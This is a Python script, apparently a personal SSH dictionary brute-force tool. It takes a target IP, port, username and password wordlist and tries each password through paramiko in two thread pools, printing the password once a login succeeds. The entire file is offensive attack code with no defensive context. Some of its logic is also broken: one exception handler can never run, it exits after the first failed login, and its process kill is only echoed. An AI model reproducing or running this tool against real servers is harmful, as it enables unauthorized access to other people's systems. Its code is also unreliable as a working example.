#!/usr/bin/python3

# Author: Jason Brewer
# ssh bruteforce attack tool
# version: 1.0

# import warnings filter
import time
import sys
from os import system, getpid, path
from multiprocessing.pool import ThreadPool
import optparse
from warnings import simplefilter


def dependencies():

    # Checking to see if python3-paramiko is installed
    paramikoCheck = path.exists("/usr/share/doc/python3-paramiko")
    pythonCheck38 = path.exists("/usr/bin/python3.8")
    pythonCheck39 = path.exists("/usr/bin/python3.9")
    if not paramikoCheck:
        print("\n[!!!] User needs to 'sudo apt install python3-paramiko'\n")
        installParamiko = input("Do you want to install python3-paramiko? (y/n) ")
        if installParamiko == 'y':
            system("sudo apt install python3-paramiko -y")
            exit(0)
        else:
            print("\n[!!!] User cannot run the program without python3-paramiko\n")
            exit(-1)
    
    if not pythonCheck38 and not pythonCheck39:
        print("\n[!!!] It is recommended to install python3.8 or python3.9 to eliminate cryptographic warnings\n") 
        installPython = input("Do you want to install python3.8? (y/n) ")
        if installPython == 'y':
            print("\n[***] Defaulting to installation of python3.8. Install python3.9 at your leisure\n")
            system("sudo apt install install build-essential checkinstall; sudo apt-get install libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-dev; cd /usr/bin ; sudo wget https://www.python.org/ftp/python/3.8.12/Python-3.8.12.tgz; sudo tar xzf Python-3.8.12.tgz; cd Python-3.8.12 ; sudo ./configure --enable-optimizations ; sudo make ; sudo altinstall ; cd ../ ; sudo rm -rf Python-3.8.12.tgz")
            exit(0)
        else:
            print("\n[!!!] Without upgrading to python3.8 or python3.9, the user will continue to see cryptographic warnings until earlier versions of python3.* are removed\n")
            exit(-1)
    else:
        pass

dependencies()

# Importing paramiko after checking the correct one is installed
import paramiko

# ignore all future warnings
simplefilter(action='ignore', category=FutureWarning)

found_passwd = False

# Look in here for other details about the connection
paramiko.util.log_to_file("debug-ssh.log")

# Banner to inform user SSH servers may sometimes throttle connections
def banner():
    print ("\n[###] SSH Servers may run slow so adjust ThreadPool as needed [###]\n")

# Start Timer
bruteStart = time.time()
found_passwd = False

def connect(passwd):
    
    global found_passwd
    if not found_passwd:
        try:
            retry = 10
            timeout = 1200 
            timeout_start = time.time()
            while time.time() < timeout_start + timeout:
                time.sleep(retry)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, port, user, passwd)
                    found_passwd = True
                    print ("\n\n[+] Found Password is ==> " + passwd + " <== [+]\n")
                    time.sleep(.01)
                    bruteStop = time.time() - bruteStart
                    conv = int(bruteStop-10)
                    hours = str(conv // 3600)
                    mins = str((conv % 3600) // 60)
                    secs = str((conv % 3600) % 60)
                    print (
                        "[+] It took [ {} ] hours [ {} ] minutes [ {} ] seconds to brute-force the ssh password\n".format(hours, mins, secs))
                    pid = getpid()      # Could not find a more efficient way to terminate the process
                    system(
                        "echo kill -9 {} >/dev/null ; echo '[+] Process Gracefully Shuting Down\n'".format(pid))
                    ssh.close()
                    exit(0)
        
                except paramiko.AuthenticationException as exp:
                    if exp:
                       ssh.close()
                       pid = getpid()
                       system("echo kill -9 {} >/dev/null".format(pid))
                       exit(0)
                    else:
                        pass

                except paramiko.SSHException as e:
                    if e.message == 'Error reading SSH protocol banner':
                        continue
                    break
                except paramiko.SSHException as err:
                    while err:
                        continue

        except KeyboardInterrupt:
            sys.exit(1)
        except:
            pass


def timer(amount):

    global i
    for i in range(amount):
        print (str(amount - i),end=' ')
        sys.stdout.flush()
        time.sleep(1)
    print()
    return i


def main():

    global ip, port, user, wordlst,tds
    parser = optparse.OptionParser(
        "%prog" + " -p <port> -H <remote IP> -u <username> -w <dictionary> -t <num of thread>")
    parser.add_option("-p", dest="port", type="int",
                      help="specify port number")
    parser.add_option("-H", dest="ip", type="string",
                      help="specify IP address")
    parser.add_option("-u", dest="user", type="string",
                      help="specify user name")
    parser.add_option("-w", dest="wordlist", type="string",
                      help="specify dictionary file")
    parser.add_option("-t", dest="threads", type="int",
                      help="Increase thread count; default is 20", default=20)

    options, args = parser.parse_args()
    if (options.port is None) or (options.ip is None) or (options.user is None) or (options.wordlist is None):
        print (parser.usage)
        sys.exit(0)
    else:
        port = options.port
        ip = options.ip
        user = options.user
        wordlst = options.wordlist
        tds = options.threads

    banner()
    # Could be a better way to handle this but it works
    file = open(wordlst, encoding="ISO-8859-1")
    thrds1 = ThreadPool(tds)
    thrds2 = ThreadPool(tds)
    if tds: 
        thrds1 = ThreadPool(tds)
        thrds2 = ThreadPool(tds)
        print("Thread count is: {}".format(tds))
    else:
        print("Thread count is default at 20")

    wordlst = []
    print ("\nLoading dictionary into memory...")
    for line in file.readlines():
        passwd = line.strip("\n").rstrip()
        wordlst.append(passwd)
    cnt = len(wordlst)
    num = "{:,}".format(cnt)
    if str(len(num)) == '9':        # Didn't feel like adding more than this
        print ("\nFinished loading " + str(num) +
               " million passwords into memory...Beginning dictionary attack in  ",)
    elif str(len(num)) == '10':
        print ("\nFinished loading " + str(num) +
               " million passwords into memory...Beginning dictionary attack in ",)
    elif str(len(num)) == '11':
        print ("\nFinished loading " + str(num) +
               " million passwords into memory...Beginning dictionary attack in ",)
    elif str(len(num)) == '12':
        print ("\nFinished loading " + str(num) +
               " billion passwords into memory...Beginning dictionary attack in ",)
    elif str(len(num)) == '13':
        print ("\nFinished loading " + str(num) +
               " billion passwords into memory...Beginning dictionary attack in ",)
    elif str(len(num)) == '14':
        print ("\nFinished loading " + str(num) +
               " billion passwords into memory...Beginning dictionary attack in ",)
    else:
        print ("\nFinished loading " + str(num) + " passwords into memory...Beginning dictionary attack in ",)

    timer(3)
    time.sleep(.5)

    evens = []
    odds = []
    for index,value in enumerate(wordlst, start=1):
        if not index % 2:
            evens.append(value)
        else:
            odds.append(value)

    print("\nThreadPool 1 Active with ~{} threads running".format(tds))
    if evens:
        thrds1.map(connect,evens)
        if found_passwd == True:
            exit(0)
    print("\nThreadPool 2 Active with ~{} threads running".format(tds))
    if odds:
        thrds2.map(connect,odds)
        if found_passwd == True:
            exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
